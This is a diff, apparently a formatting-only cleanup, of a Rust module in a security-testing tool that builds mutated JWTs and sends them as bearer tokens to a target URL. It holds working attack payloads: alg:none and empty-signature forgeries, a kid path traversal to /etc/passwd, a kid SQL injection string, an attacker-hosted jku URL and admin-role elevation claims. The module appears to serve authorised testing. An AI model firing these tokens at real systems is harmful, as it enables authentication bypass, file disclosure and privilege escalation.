@@ -126,15 +126,13 @@ pub fn generate_jwt_variants(baseline: &str) -> Vec<JwtProbe> {
     // ── alg:none family ──
     out.push(JwtProbe {
         kind: "alg-none-lowercase",
-        description:
-            "alg:`none` — strips signature; server that skips sig check on \
+        description: "alg:`none` — strips signature; server that skips sig check on \
              alg:none accepts a freely-modified payload",
         mutated_token: build_jwt(&with_alg(&header, "none"), &payload, ""),
     });
     out.push(JwtProbe {
         kind: "alg-none-capital",
-        description:
-            "alg:`None` — case-fold confusion; libraries that string-compare \
+        description: "alg:`None` — case-fold confusion; libraries that string-compare \
              alg case-sensitively reject lowercase but accept the variant",
         mutated_token: build_jwt(&with_alg(&header, "None"), &payload, ""),
     });
@@ -152,8 +150,7 @@ pub fn generate_jwt_variants(baseline: &str) -> Vec<JwtProbe> {
     // ── Empty signature with original alg preserved ──
     out.push(JwtProbe {
         kind: "empty-sig-original-alg",
-        description:
-            "alg preserved (e.g. HS256) but signature segment is empty — \
+        description: "alg preserved (e.g. HS256) but signature segment is empty — \
              servers that look only at header.alg before verifying sig may \
              accept",
         mutated_token: build_jwt(&header, &payload, ""),
@@ -162,8 +159,7 @@ pub fn generate_jwt_variants(baseline: &str) -> Vec<JwtProbe> {
     // ── kid traversal ──
     out.push(JwtProbe {
         kind: "kid-path-traversal",
-        description:
-            "`kid` header field set to `../../../etc/passwd` — servers that \
+        description: "`kid` header field set to `../../../etc/passwd` — servers that \
              use kid as a path to look up keys may read arbitrary files",
         mutated_token: build_jwt(
             &with_field(&header, "kid", json!("../../../etc/passwd")),
@@ -173,8 +169,7 @@ pub fn generate_jwt_variants(baseline: &str) -> Vec<JwtProbe> {
     });
     out.push(JwtProbe {
         kind: "kid-sql-injection",
-        description:
-            "`kid` SQL-payload — servers that look up kid in a DB without \
+        description: "`kid` SQL-payload — servers that look up kid in a DB without \
              parameterisation are vulnerable",
         mutated_token: build_jwt(
             &with_field(&header, "kid", json!("x' UNION SELECT 'secret'--")),
@@ -186,8 +181,7 @@ pub fn generate_jwt_variants(baseline: &str) -> Vec<JwtProbe> {
     // ── jku / x5u attacker-URL ──
     out.push(JwtProbe {
         kind: "jku-attacker-url",
-        description:
-            "`jku` header set to attacker-hosted JWK set URL — servers that \
+        description: "`jku` header set to attacker-hosted JWK set URL — servers that \
              fetch keys from operator-controlled URLs accept attacker-signed \
              tokens",
         mutated_token: build_jwt(
@@ -200,8 +194,7 @@ pub fn generate_jwt_variants(baseline: &str) -> Vec<JwtProbe> {
     // ── Expired exp ──
     out.push(JwtProbe {
         kind: "expired-exp",
-        description:
-            "`exp` claim set to a date 10 years in the past — servers that \
+        description: "`exp` claim set to a date 10 years in the past — servers that \
              don't validate exp accept stale tokens forever",
         mutated_token: build_jwt(
             &header,
@@ -213,8 +206,7 @@ pub fn generate_jwt_variants(baseline: &str) -> Vec<JwtProbe> {
     // ── Future nbf ──
     out.push(JwtProbe {
         kind: "future-nbf",
-        description:
-            "`nbf` (not-before) claim set to far future — servers that don't \
+        description: "`nbf` (not-before) claim set to far future — servers that don't \
              validate nbf accept tokens that 'aren't valid yet'",
         mutated_token: build_jwt(
             &header,
@@ -226,8 +218,7 @@ pub fn generate_jwt_variants(baseline: &str) -> Vec<JwtProbe> {
     // ── Privilege escalation in payload ──
     out.push(JwtProbe {
         kind: "role-elevation",
-        description:
-            "Set common admin fields (`role:admin`, `is_admin:true`, \
+        description: "Set common admin fields (`role:admin`, `is_admin:true`, \
              `permissions:[\"*\"]`) in the payload — servers that don't \
              validate sig let the elevated token through",
         mutated_token: {
@@ -258,7 +249,11 @@ pub async fn run_jwt_diff(args: JwtDiffArgs) -> ExitCode {
         eprintln!(
             "{} probing {} JWT mutations against {}",
             "[wafrift jwt-diff]".bright_cyan().bold(),
-            generate_jwt_variants(&args.token).len().to_string().bold().yellow(),
+            generate_jwt_variants(&args.token)
+                .len()
+                .to_string()
+                .bold()
+                .yellow(),
             args.url.bright_white()
         );
     }
@@ -345,11 +340,7 @@ pub async fn run_jwt_diff(args: JwtDiffArgs) -> ExitCode {
     ExitCode::SUCCESS
 }
 
-async fn fire_with_bearer(
-    http: &Client,
-    url: &str,
-    token: &str,
-) -> Result<(u16, usize), String> {
+async fn fire_with_bearer(http: &Client, url: &str, token: &str) -> Result<(u16, usize), String> {
     let resp = http
         .get(url)
         .header("Authorization", format!("Bearer {token}"))
@@ -442,9 +433,8 @@ fn emit_output(
 /// Encode bytes as URL-safe base64 WITHOUT padding (per RFC 7515
 /// §2 — JWS uses unpadded base64url throughout).
 fn b64url_encode(bytes: &[u8]) -> String {
-    const ALPHABET: &[u8; 64] =
-        b"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789-_";
-    let mut out = String::with_capacity((bytes.len() * 4 + 2) / 3);
+    const ALPHABET: &[u8; 64] = b"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789-_";
+    let mut out = String::with_capacity((bytes.len() * 4).div_ceil(3));
     let mut i = 0;
     while i + 3 <= bytes.len() {
         let b0 = bytes[i] as u32;
@@ -520,7 +510,11 @@ fn decode_b64url_json(s: &str) -> Option<Value> {
 
 fn build_jwt(header: &Value, payload: &Value, sig: &str) -> String {
     let h = b64url_encode(serde_json::to_string(header).unwrap_or_default().as_bytes());
-    let p = b64url_encode(serde_json::to_string(payload).unwrap_or_default().as_bytes());
+    let p = b64url_encode(
+        serde_json::to_string(payload)
+            .unwrap_or_default()
+            .as_bytes(),
+    );
     format!("{h}.{p}.{sig}")
 }
 
@@ -692,7 +686,10 @@ mod tests {
     #[test]
     fn generate_jwt_variants_role_elevation_carries_admin_claims() {
         let v = generate_jwt_variants(&valid_baseline_jwt());
-        let probe = v.iter().find(|p| p.kind == "role-elevation").expect("probe");
+        let probe = v
+            .iter()
+            .find(|p| p.kind == "role-elevation")
+            .expect("probe");
         let parts: Vec<&str> = probe.mutated_token.split('.').collect();
         let payload = decode_b64url_json(parts[1]).expect("decode");
         assert_eq!(payload["role"], "admin");
@@ -712,7 +709,10 @@ mod tests {
     #[test]
     fn generate_jwt_variants_jku_attacker_url_uses_attacker_domain() {
         let v = generate_jwt_variants(&valid_baseline_jwt());
-        let probe = v.iter().find(|p| p.kind == "jku-attacker-url").expect("probe");
+        let probe = v
+            .iter()
+            .find(|p| p.kind == "jku-attacker-url")
+            .expect("probe");
         let parts: Vec<&str> = probe.mutated_token.split('.').collect();
         let header = decode_b64url_json(parts[0]).expect("decode");
         let jku = header["jku"].as_str().expect("jku");
